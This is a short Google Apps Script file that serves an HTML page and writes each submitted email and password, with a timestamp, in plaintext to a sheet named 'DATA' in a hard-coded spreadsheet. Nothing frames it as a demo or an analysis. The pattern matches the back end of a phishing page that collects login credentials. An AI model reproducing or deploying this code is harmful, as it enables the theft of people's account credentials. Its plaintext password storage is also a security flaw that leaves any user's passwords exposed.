function doGet() {
  return HtmlService.createHtmlOutputFromFile('index');
}

function saveToSpreadsheet(email, password) {
  const spreadsheetId = '1houjx26ln2gVdlEyIPUguIWWqFTVhdlL3ztJxoMifBw'; // Spreadsheet ID from the URL
  const sheetName = 'DATA'; // Target sheet name
  const sheet = SpreadsheetApp.openById(spreadsheetId).getSheetByName(sheetName);
  
  if (sheet) {
    // Append a new row with the current timestamp, email, and password
    sheet.appendRow([new Date(), email, password]);
  } else {
    throw new Error(`Sheet with name "${sheetName}" not found.`);
  }
}
